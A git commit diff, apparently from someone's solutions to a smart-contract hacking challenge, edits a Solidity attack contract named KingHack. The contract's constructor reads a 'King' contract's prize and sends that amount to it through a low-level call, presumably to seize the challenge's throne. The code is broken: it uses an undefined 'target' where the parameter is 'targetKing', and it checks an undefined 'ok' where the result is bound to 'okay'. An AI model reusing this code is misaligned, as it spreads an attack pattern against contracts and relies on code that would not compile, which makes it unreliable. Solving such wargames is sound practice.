9b9b7dc9a94d14fef40d2e1de8faad05f3559bec
miield <aodasola95@gmail.com>
2023-04-25 22:58:31 +0100

    Update Level9 King

--- King/kingHack.sol
+++ King/kingHack.sol
@@ -6,7 +6,10 @@ import "./king.sol";
 contract KingHack {
 
     constructor (address payable targetKing) payable {
+        uint prize = King(target).prize();
+        // low-level function
         (bool okay,) = target.call{value: prize} ("");
+        require(ok, "call failed");
     }
 
 }
